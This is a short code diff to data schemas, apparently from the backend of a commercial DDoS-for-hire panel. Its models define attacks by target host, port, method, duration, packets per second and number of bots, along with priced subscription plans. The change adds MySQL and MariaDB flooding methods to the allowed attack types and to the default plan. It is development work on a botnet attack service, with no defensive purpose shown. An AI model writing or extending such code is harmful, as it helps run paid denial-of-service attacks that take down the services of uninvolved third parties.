@@ -92,7 +92,7 @@ class BotThrottle(BaseModel):
 class AttackCreate(BaseModel):
     target_host: str
     target_port: int = Field(..., ge=1, le=65535)
-    method: str = Field(default="PSPE", pattern="^(PSPE|MEGA|TCP|TLS|TLS_EXHAUST|HTTP|SLOWLORIS|GAME)$")
+    method: str = Field(default="PSPE", pattern="^(PSPE|MEGA|TCP|TLS|TLS_EXHAUST|HTTP|SLOWLORIS|GAME|MYSQL|SQL|MARIADB)$")
     duration_secs: int = Field(default=60, ge=1, le=3600)
     pps_per_bot: int = Field(default=100000, ge=1, le=100000000)
     bot_count: int = Field(default=1, ge=1, le=100)
@@ -166,7 +166,7 @@ class PlanCreate(BaseModel):
     max_attack_secs: int = 120
     cooldown_secs: int = 300
     max_pps_per_bot: int = 500000
-    allowed_methods: List[str] = ["PSPE","TCP","TLS","HTTP","GAME"]
+    allowed_methods: List[str] = ["PSPE","TCP","TLS","HTTP","GAME","MYSQL"]
     price_vnd: int = 10000
     price_usd: float = 0.5
     is_active: bool = True
